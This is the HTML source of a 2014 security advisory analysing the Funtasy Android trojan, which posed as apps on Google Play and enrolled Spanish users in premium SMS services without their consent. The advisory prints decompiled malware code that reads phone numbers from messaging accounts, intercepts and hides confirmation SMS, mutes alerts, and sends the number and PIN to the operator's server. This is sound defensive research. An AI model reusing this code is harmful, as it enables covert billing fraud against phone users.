
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Funtasy Trojan Targets Spanish Android Users with Sneaky SMS Charges</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/funtasy-trojan-targets-spanish-android-users-sneaky-sms-charges/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Palo Alto Networks researchers report: Funtasy Trojan targets Spanish Android users with sneaky SMS charges. Find out more about this trojan."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/funtasy-trojan-targets-spanish-android-users-sneaky-sms-charges/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Funtasy Trojan Targets Spanish Android Users with Sneaky SMS Charges" />
<meta property="og:description" content="Palo Alto Networks researchers report: Funtasy Trojan targets Spanish Android users with sneaky SMS charges. Find out more about this trojan." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/funtasy-trojan-targets-spanish-android-users-sneaky-sms-charges/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Android" />
<meta property="article:tag" content="Funtasy" />
<meta property="article:tag" content="Trojan" />
<meta property="article:section" content="Threat Advisories - Advisories" />
<meta property="article:published_time" content="2014-05-12T18:32:52+00:00" />
<meta property="article:modified_time" content="2018-11-01T09:13:16+00:00" />
<meta property="og:updated_time" content="2018-11-01T09:13:16+00:00" />
<meta property="og:image" content="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2014/05/pic-1-500x155.png" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Palo Alto Networks researchers report: Funtasy Trojan targets Spanish Android users with sneaky SMS charges. Find out more about this trojan." />
<meta name="twitter:title" content="Funtasy Trojan Targets Spanish Android Users with Sneaky SMS Charges" />
<meta name="twitter:image" content="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2014/05/pic-1-500x155.png" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Funtasy Trojan Targets Spanish Android Users with Sneaky SMS Charges Comments Feed" href="https://unit42.paloaltonetworks.com/funtasy-trojan-targets-spanish-android-users-sneaky-sms-charges/feed/" />
<meta property="og:likes" content="1"/>
<meta property="og:readtime" content="8"/>
<meta property="og:views" content="7,724"/>
<meta property="og:date_created" content="May 12, 2014 at 11:32 AM"/>
<meta property="og:post_length" content="2212"/>
<meta property="og:category" content="Threat Advisories - Advisories"/>
<meta property="og:category" content="Threat Prevention"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-advisories-advisories/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-prevention-2/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Zhi Xu"/>
<meta property="og:author" content="Claud Xiao"/>
<meta property="og:author" content="Ryan Olson"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/zhi-xu/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/claud-xiao/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/ryan-olson/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://secure.gravatar.com/avatar/7f52882b927e67a6d99f6722206a6631?s=72&#038;d=https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg&#038;r=g"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Funtasy Trojan Targets Spanish Android Users with Sneaky SMS Charges","name":"Funtasy Trojan Targets Spanish Android Users with Sneaky SMS Charges","description":"Summary A new Android Trojan, named Funtasy, began targeting Spanish Android users in mid-April. Users have downloaded 18 different variants of Funtasy between 13,500 and 67,000 times from the Google Play store. Funtasy currently targets users of multiple Spanish mobile networks, and one Australian mobile network. Funtasy subscribes victim\u2019s phones to premium SMS services which...","url":"https:\/\/unit42.paloaltonetworks.com\/funtasy-trojan-targets-spanish-android-users-sneaky-sms-charges\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/funtasy-trojan-targets-spanish-android-users-sneaky-sms-charges\/","datePublished":"May 12, 2014","articleBody":"Summary\r\n\r\n \tA new Android Trojan, named Funtasy, began targeting Spanish Android users in mid-April.\r\n \tUsers have downloaded 18 different variants of Funtasy between 13,500 and 67,000 times from the Google Play store.\r\n \tFuntasy currently targets users of multiple Spanish mobile networks, and one Australian mobile network.\r\n \tFuntasy subscribes victim\u2019s phones to premium SMS services which cost up to 30 euros per month, while hiding the evidence of the subscription.\r\n\r\nLet the Funtasy Begin\r\n\r\n\r\nPalo Alto Networks WildFire detected a new Android Trojan on May 7th, 2014 when a customer using our enterprise security platform downloaded the malicious application from the Google Play store. We\u2019ve named the malware family Funtasy, based on the domain it uses for registering compromised phones to the premium SMS service. The first version of Funtasy we detected is a fake television remote control application.\r\n\r\n\r\nFigure 1: Funtasy Trojan Disguised as TV Remote Control App.\r\nA developer using the ID \u201cfun app\u201d published the Trojan, and the remote control application they uploaded on April 21\u00a0is their most successful app so far, with between 10,000 and 50,000 downloads on the play store. Based on the reviews, the application does not function very well as a remote, but in reality it doesn\u2019t contain remote control capability. There\u2019s no mention of a premium SMS service in the description, but a review of the permissions reveals that the program will have complete access to SMS messages.\r\n\r\n\r\nFigure 2: Remote control app requests complete control over your SMS messages.\r\nAfter the user installs the remote application and opens it, they are presented with a terms of service screen. This is the user\u2019s only chance to realize that opening this application is going to cost them dearly.\r\n\r\n\r\nFigure 3: Remote control app terms of service.\r\nIf you can\u2019t read the fine print, I don\u2019t blame you. Here\u2019s the text decoded from the application\u2019s source code.\r\n\r\nServicio de suscripci\u00f3n para usuarios Movistar, Vodafone, Orange, Yoigo, R y Simyo para mayores de edad o menores con capacidad legal para contratar, prestados por (FUNTASY MOBILE S.L., operador titular ARGATEL SOLUTIONS SL, n. atenci\u00f3n al cliente 902 303 803 \u00f3 inf@argatel.com, apartado de correos 167, 17001 Girona. Coste por SMS recibido 1.46 euros\/sms (IVA incluido) m\u00e1s el coste de navegaci\u00f3n WAP, que depender\u00e1 del operador que tenga contratado. M\u00e1ximo 10 sms\/semana. El l\u00edmite m\u00e1ximo de facturaci\u00f3n del servicio puede variar en funci\u00f3n de tu operador (18 a 30 euros\/mes). Baja autom\u00e1tica para cancelar el servicio: env\u00eda BAJA al 797977.\r\n\r\nThis message is pretty straightforward, assuming the user actually reads it. It explains that by opening the application the reader agrees to receive up to 10 SMS messages a week at a cost of 1.46 euros each. The maximum cost per month should between 18 and 30 euros per month. If the user would like to unsubscribe they can text \u201cBAJA\u201d to 797977. Any user who reads this message and understands it is unlikely to agree, but Funtasy does not even wait for their agreement.\r\n\r\nWhile the terms page is on the screen, in the background the Trojan checks to see if the phone is attached to a network with one of the following mobile network codes (MNC):\r\n\r\n \t21401: Vodafone Spain\r\n \t21403: France Telecom Espa\u00f1a SA\r\n \t21404: Xfera Moviles SA\r\n \t21406: Vodafone Spain\r\n \t21407: Telef\u00f3nica M\u00f3viles Espa\u00f1a\r\n \t21416: Telecable de Asturias S.A.U.\r\n \t21417: R Cable y Telecomunicaciones Galicia S.A.\r\n \t21418: Cableuropa S.A.U.\r\n \t21419: E-PLUS Moviles Virtuales Espa\u00f1a S.L.U.\r\n \t21421: Jazz Telecom S.A.U.\r\n \t50503: Vodafone Hutchison Australia Proprietary Limited\r\n\r\nEach of these networks is Spanish, except for a single Australian network. This data, along with an encoded version of the Terms of Service are stored as static strings in the Android package file.\r\n\r\nConstants.java\r\npackage com.lasmejoresapps.tvremotecontrol;\r\n\r\npublic class Constants {\r\n    public static final String AUSTRALIA_COUNTRY_CODE = \"505\";\r\n    public static final String GOSMSPRO = \"com.jb.gosms\";\r\n    public static final String HANDCENTSMS = \"com.handcent.nextsms\";\r\n    public static final String HANGOUTS = \"com.google.android.talk\";\r\n    public static final String JAZZTEL_OPERATOR = \"JAZZTEL\";\r\n    public static final String JAZZTEL_OPERATOR_CODE = \"21421\";\r\n    public static final String MIO_OPERATOR_CODE = \"50503\";\r\n    public static final String MOVISTAR_OPERATOR = \"MOVISTAR\";\r\n    public static final String MOVISTAR_OPERATOR_CODE = \"21407\";\r\n    public static final String MOVISTAR_OPERATOR_CODE_PHP = \"364\";\r\n    public static final String ONO_OPERATOR_CODE = \"21418\";\r\n    public static final String ORANGE_OPERATOR = \"ORANGE\";\r\n    public static final String ORANGE_OPERATOR_CODE = \"21403\";\r\n    public static final String ORANGE_OPERATOR_CODE_PHP = \"363\";\r\n    public static final String ORIGIN_SMS = \"Nzk3OTc3\";\r\n    public static final String PEPEPHONE_OPERATOR_CODE = \"21406\";\r\n    public static final String R_OPERATOR_CODE = \"21417\";\r\n    public static final String R_OPERATOR_CODE_PHP = \"368\";\r\n    public static final String SECRET_FILE = \"configuration_2\";\r\n    public static final String SIMYO_OPERATOR = \"SIMYO\";\r\n    public static final String SIMYO_OPERATOR_CODE = \"21419\";\r\n    public static final String SIMYO_OPERATOR_CODE_PHP = \"367\";\r\n    public static final String SPAIN_COUNTRY_CODE = \"214\";\r\n    public static final String TELECABLE_OPERATOR_CODE = \"21416\";\r\n    public static final String TELECABLE_OPERATOR_CODE_PHP = \"369\";\r\n    public static final String TELEGRAM1 = \"org.telegram.messenger.account\";\r\n    public static final String TELEGRAM2 = \"org.telegram.account\";\r\n    public static final String TERMS = \"U2VydmljaW8gZGUgc3VzY3JpcGNpw7NuIHBhcmEgdXN1YXJpb3MgTW92aXN0YXIsIFZvZGFmb25lLCBPcmFuZ2UsIFlvaWdvLCBSIHkgU2lteW8gcGFyYSBtYXlvcmVzIGRlIGVkYWQgbyBtZW5vcmVzIGNvbiBjYXBhY2lkYWQgbGVnYWwgcGFyYSBjb250cmF0YXIsIHByZXN0YWRvcyBwb3IgKEZVTlRBU1kgTU9CSUxFIFMuTC4sIG9wZXJhZG9yIHRpdHVsYXIgQVJHQVRFTCBTT0xVVElPTlMgU0wsIG4uIGF0ZW5jacOzbiBhbCBjbGllbnRlIDkwMiAzMDMgODAzIMOzIGluZkBhcmdhdGVsLmNvbSwgYXBhcnRhZG8gZGUgY29ycmVvcyAxNjcsIDE3MDAxIEdpcm9uYS4gQ29zdGUgcG9yIFNNUyByZWNpYmlkbyAxLjQ2IGV1cm9zL3NtcyAoSVZBIGluY2x1aWRvKSBtw6FzIGVsIGNvc3RlIGRlIG5hdmVnYWNpw7NuIFdBUCwgcXVlIGRlcGVuZGVyw6EgZGVsIG9wZXJhZG9yIHF1ZSB0ZW5nYSBjb250cmF0YWRvLiBNw6F4aW1vIDEwIHNtcy9zZW1hbmEuIEVsIGzDrW1pdGUgbcOheGltbyBkZSBmYWN0dXJhY2nDs24gZGVsIHNlcnZpY2lvIHB1ZWRlIHZhcmlhciBlbiBmdW5jacOzbiBkZSB0dSBvcGVyYWRvciAoMTggYSAzMCBldXJvcy9tZXMpLiBCYWphIGF1dG9tw6F0aWNhIHBhcmEgY2FuY2VsYXIgZWwgc2VydmljaW86IGVudsOtYSBCQUpBIGFsIDc5Nzk3Ny4=\";\r\n    public static final String TEXTSECURE = \"org.thoughtcrime.securesms\";\r\n    public static final String URL = \"aHR0cDovL2Z1bnRhc3ltb2JpbGUuY29tL2FsZXJ0YXNfYWx0YV93ZWIucGhw\";\r\n    public static final String VODAFONE_OPERATOR = \"VODAFONE ES\";\r\n    public static final String VODAFONE_OPERATOR_CODE = \"21401\";\r\n    public static final String VODAFONE_OPERATOR_CODE_PHP = \"365\";\r\n    public static final String WHATSAPP = \"com.whatsapp\";\r\n    public static final String YOIGO_OPERATOR = \"YOIGO\";\r\n    public static final String YOIGO_OPERATOR_CODE = \"21404\";\r\n    public static final String YOIGO_OPERATOR_CODE_PHP = \"55\";\r\n\r\n    public Constants() {\r\n        super();\r\n    }\r\n}\r\nAfter determining the phone is on one of the correct networks, the malware searches for the phone\u2019s mobile number. It does this in three ways:\r\n\r\n \tInvoking the TelephonyManager\u2019s getLine1Number() method.\r\n \tTraversing the phones call logs and parsing the phones outgoing number.\r\n \tSearching the phone for account numbers associated with messaging apps WhatsApp and Telegram.\u00a0 If a user has registered with one of these applications using a number not associated with the phone, that number will be used by Funtasy.\r\n\r\nUtil.java\r\nprivate static String getPhoneNumberFromAccounts(Context context) throws Exception {\r\n        String v2;\r\n        int v8;\r\n        Account[] v1;\r\n        Log.i(\"Util\", \"begin method getPhoneNumberFromAccounts\");\r\n        String v7 = null;\r\n        try {\r\n            v1 = AccountManager.get(context).getAccounts();\r\n            String v5 = \"telegram\";\r\n            int v9 = v1.length;\r\n            v8 = 0;\r\n        }\r\n        catch(Exception v6) {\r\n            goto label_46;\r\n        }\r\n\r\n        while(true) {\r\n            if(v8 &gt;= v9) {\r\n                goto label_10;\r\n            }\r\n\r\n            try {\r\n                Account v0 = v1[v8];\r\n                v2 = v0.name;\r\n                String v3 = v0.type;\r\n                if(!v3.equals(\"com.whatsapp\")) {\r\n                    if(!v3.equals(\"org.telegram.messenger.account\") &amp;&amp; !v3.equals(\"org.telegram.account\")\r\n                             &amp;&amp; !v3.contains(((CharSequence)v5))) {\r\n                        goto label_37;\r\n                    }\r\n\r\n                    break;\r\n                }\r\n                else if(!v2.equals(\"WhatsApp\") &amp;&amp; (Util.isANumber(v2))) {\r\n                    v7 = Util.formatPhoneNumber(v2);\r\n                    goto label_10;\r\n                }\r\n            }\r\n            catch(Exception v6) {\r\n                goto label_46;\r\n            }\r\n\r\n        label_37:\r\n            ++v8;\r\n        }\r\n\r\n        try {\r\n            v7 = Util.formatPhoneNumber(v2);\r\n        }\r\n        catch(Exception v6) {\r\n        label_46:\r\n            Log.e(\"Util\", \"error method getPhoneNumberFromAccounts: \" + v6.getMessage());\r\n            v6.printStackTrace();\r\n        }\r\n\r\n    label_10:\r\n        Log.i(\"Util\", \"end method getPhoneNumberFromAccounts\");\r\n        return v7;\r\n    }\r\nWith the phone\u2019s number captured, Funtasy then registers the mobile account with a premium SMS service by sending an HTTP POST request to the following URL.\r\n\r\n \thttp:\/\/funtasymobile.com\/alertas_alta_web.php\r\n\r\nThe request is made without the users knowledge, they have no choice to select a number. Of course, premium SMS services require that the user confirm that they want to sign up by sending incoming SMS message containing a PIN.\u00a0 Funtasy\u00a0 intercepts this message, parses out the PIN and sends it back to the registration server, completing the enrollment process.\r\n\r\nIncomingSms.java\r\npackage com.lasmejoresapps.tvremotecontrol;\r\n\r\nimport android.content.BroadcastReceiver;\r\nimport android.content.ContentValues;\r\nimport android.content.Context;\r\nimport android.content.Intent;\r\nimport android.net.Uri;\r\nimport android.os.Bundle;\r\nimport android.telephony.SmsMessage;\r\nimport android.util.Log;\r\n\r\npublic class IncomingSms extends BroadcastReceiver {\r\n    private static final String TAG = \"IncomingSms\";\r\n    private String operator;\r\n    private String paso;\r\n    private String phoneNumber;\r\n    private String pin;\r\n    private String url;\r\n\r\n    public IncomingSms() {\r\n        super();\r\n    }\r\n\r\n    private void changeSms(Context context, Intent intent) throws Exception {\r\n        int v5;\r\n        long v2;\r\n        String v0;\r\n        String v8;\r\n        Log.i(\"IncomingSms\", \"begin method changeSms\");\r\n        try {\r\n            Bundle v1 = intent.getExtras();\r\n            v8 = \"\";\r\n            v0 = \"\";\r\n            v2 = 0;\r\n            if(v1 == null) {\r\n                goto label_38;\r\n            }\r\n\r\n            Object v7 = v1.get(\"pdus\");\r\n            SmsMessage[] v6 = new SmsMessage[v7.length];\r\n            v5 = 0;\r\n            while(true) {\r\n            label_14:\r\n                if(v5 &gt;= v6.length) {\r\n                    goto label_16;\r\n                }\r\n\r\n                v6[v5] = SmsMessage.createFromPdu(v7[v5]);\r\n                v8 = String.valueOf(v8) + v6[v5].getOriginatingAddress();\r\n                v0 = String.valueOf(v0) + v6[v5].getMessageBody();\r\n                v2 = v6[v5].getTimestampMillis();\r\n                if(v0 != null &amp;&amp; !v0.equals(\"\") &amp;&amp; (v8.equals(Util.decode(\"Nzk3OTc3\")))) {\r\n                    this.pin = this.getPinFromSms(v0);\r\n                }\r\n\r\n                break;\r\n            }\r\n        }\r\n        catch(Exception v4) {\r\n            goto label_78;\r\n        }\r\n\r\n        ++v5;\r\n        goto label_14;\r\n        try {\r\n        label_16:\r\n            this.stopSms();\r\n            ContentValues v9 = new ContentValues();\r\n            v9.put(\"address\", v8);\r\n            v9.put(\"body\", v0);\r\n            v9.put(\"read\", Integer.valueOf(1));\r\n            v9.put(\"date\", Double.valueOf((((double)v2)) - 1296000000 + 15240000));\r\n            context.getContentResolver().insert(Uri.parse(\"content:\/\/sms\/inbox\"), v9);\r\n        }\r\n        catch(Exception v4) {\r\n        label_78:\r\n            Log.e(\"IncomingSms\", \"error method changeSms: \" + v4.getMessage());\r\n            v4.printStackTrace();\r\n        }\r\n\r\n    label_38:\r\n        Log.i(\"IncomingSms\", \"end method changeSms\");\r\n    }\r\n\r\n    private String getPinFromSms(String message) throws Exception {\r\n        String v1;\r\n        Log.i(\"IncomingSms\", \"begin method getPinFromSms\");\r\n        try {\r\n            v1 = Util.extractNumber(message);\r\n        }\r\n        catch(Exception v0) {\r\n            Log.i(\"IncomingSms\", \"error method getPinFromSms: \" + v0.getMessage());\r\n            v0.printStackTrace();\r\n        }\r\n\r\n        Log.i(\"IncomingSms\", \"end method getPinFromSms\");\r\n        return v1;\r\n    }\r\n\r\n    private void muteNotification(Context context) throws Exception {\r\n        Log.i(\"IncomingSms\", \"begin method muteNotification\");\r\n        try {\r\n            context.getSystemService(\"audio\").setStreamMute(5, true);\r\n        }\r\n        catch(Exception v1) {\r\n            Log.e(\"IncomingSms\", \"error method muteNotification: \" + v1.getMessage());\r\n            v1.printStackTrace();\r\n        }\r\n\r\n        Log.i(\"IncomingSms\", \"end method muteNotification\");\r\n    }\r\n\r\n    public void onReceive(Context context, Intent intent) {\r\n        Log.i(\"IncomingSms\", \"begin method onReceive\");\r\n        try {\r\n            this.muteNotification(context);\r\n            this.changeSms(context, intent);\r\n            Context v1 = context.getApplicationContext();\r\n            this.phoneNumber = ((Request)v1).getPhoneNumber();\r\n            this.paso = \"3\";\r\n            this.operator = ((Request)v1).getOperator();\r\n            ((Request)v1).setPin(this.pin);\r\n            new SendPostReqAsync().execute(new String[]{Util.decode(\"aHR0cDovL2Z1bnRhc3ltb2JpbGUuY29tL2FsZXJ0YXNfYWx0YV93ZWIucGhw\"), \r\n                    this.phoneNumber, this.operator, this.paso, this.pin});\r\n        }\r\n        catch(Exception v0) {\r\n            Log.e(\"IncomingSms\", \"error method onReceive: \" + v0.getMessage());\r\n            v0.printStackTrace();\r\n        }\r\n\r\n        Log.i(\"IncomingSms\", \"end method onReceive\");\r\n    }\r\n\r\n    private void stopSms() throws Exception {\r\n        Log.i(\"IncomingSms\", \"begin method stopSms\");\r\n        try {\r\n            this.abortBroadcast();\r\n        }\r\n        catch(Exception v0) {\r\n            Log.e(\"IncomingSms\", \"error method stopSms: \" + v0.getMessage());\r\n            v0.printStackTrace();\r\n        }\r\n\r\n        Log.i(\"IncomingSms\", \"end method stopSms\");\r\n    }\r\n}\r\n\r\nOf course, once users begin receiving the SMS messages, they are likely to unsubscribe from the service they never really wanted. To prevent this, Funtasy blocks the incoming messages before they are displayed to the user and modifies the time stamp on each message to make them appear to have been received 15 days earlier. This moves it to the back of the inbox there the victim is unlikely to ever see it.\u00a0 Funtasy does this even when the victim uses alternative SMS managers, like Google Hangouts or GO SMS Pro.\r\nOscar Sanchez\r\nAfter evaluating the remote control app and finding malicious behavior, we decided to evaluate all of the other applications published by \u201cfun app\u201d, and found 12 more which all contains the exact same behavior.\r\n\r\n\r\nFigure 4: Additional \u201cfun app\u201d applications, all contain the Funtasy Trojan.\r\nEach of these applications is designed to appear like a legitimate application already in the app store. To raise the ranking of these apps, the author appears to have given many of them five-star ratings. Unfortunately for them, this gave us additional insight into their operation.\r\n\r\nTo rate and comment on applications, users must have a Google account. One account using the name \u201cOscar Sanchez\u201d gave high ratings and positive comments to many of the \u201cfun app\u201d applications. He also rated apps made by two additional publishers with the names \"MilApps101\" and \"Milapps102.\" Between the two of these developers they have produced five applications, and we\u2019ve found that every one of them contains the Funtasy Trojan. While the name \u201cOscar Sanchez\u201d may be a pseudonym, Whois data indicates it was also used to register the domain hosting the Funtasy Mobile premium SMS service.\r\n\r\nIn total we\u2019ve found 18 different applications in the Google Play store that contain the Funtasy Trojan. Each of these files also has the same internal class structure, which is represented by the tree structure below.\r\n\r\n\r\nFigure 5: Funtasy internal class structure.\r\nResearchers interested in investigating them further can find more information in the table below.\r\nUsing this Trojan the attacker could be generating up to 30 euros per month for over 67,000 infected mobile phones. That adds up to 2 million euros per month, but the actual number is likely much lower. Many of the users who downloaded the tool may not be using one of the targeted Spanish or Australian networks.\r\n\r\nFigure 6: List of Android APK files infected with Funtasy Trojan\r\nUsers who want to defend against the Funtasy Trojan should not rely on traditional antivirus programs, as they do not currently detect this threat. Common sense is the best defense against these types of abusive programs. While many users breeze past the list of permissions required when installing new apps, readers of this blog should ask themselves, \u201cDoes my electronic bible need to read my SMS messages?\u201d\r\n\r\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"","width":"","height":""},"author":[{"@type":"Person","name":"Zhi Xu"},{"@type":"Person","name":"Claud Xiao"},{"@type":"Person","name":"Ryan Olson"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"5544","token":"7e15a0f8b3","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=5544' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Ffuntasy-trojan-targets-spanish-android-users-sneaky-sms-charges%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Ffuntasy-trojan-targets-spanish-android-users-sneaky-sms-charges%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
